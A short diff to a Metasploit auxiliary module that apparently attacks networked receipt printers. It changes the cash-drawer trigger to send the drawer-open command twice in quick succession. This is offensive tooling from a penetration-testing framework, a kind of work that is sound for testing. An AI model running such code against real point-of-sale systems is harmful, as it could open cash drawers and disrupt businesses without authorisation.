@@ -61,12 +61,14 @@ class MetasploitModule < Msf::Auxiliary
         sock.put(print_commands)
         disconnect
 
-        # Optionally trigger the drawer
+        # Optionally trigger the drawer (send twice with short delay)
         if trigger_drawer
-          sleep(1)
-          connect
-          sock.put(DRAWER_COMMAND)
-          disconnect
+          2.times do
+            connect
+            sock.put(DRAWER_COMMAND)
+            disconnect
+            sleep(0.5)
+          end
           print_status("Triggered cash drawer on #{rhost_ip}")
         end
 
